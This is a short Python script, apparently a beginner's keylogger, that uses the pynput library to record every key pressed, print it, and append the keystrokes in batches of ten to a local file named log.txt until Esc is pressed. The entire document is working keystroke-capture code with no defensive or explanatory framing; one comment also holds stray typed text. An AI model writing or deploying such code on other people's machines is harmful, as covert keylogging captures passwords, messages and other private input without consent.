import pynput

from pynput.keyboard import Key, Listener

count=0
keys=[]

def on_press(key):
    global keys,count
    keys.append(key)
    count +=1
    print(format(key))
    #after every 10 keys update the log file
    if count>=10:
        count = 0#reset the count
        write_file(keys)
        keys=[]#reset keys



def on_release(key):
    if key == Key.esc:
        return False
#save the keys in a text document

def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            #remove the quotation marks from the output hello my name is Camille
            k=str(key).replace("'","")
            #remove the word space from the output
            if k.find("space") >0:
                file.write('\n')
            #remove Key from backspace, esc
            elif k.find("Key") == -1:
                file.write(k)

            
#listen for key events 

with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
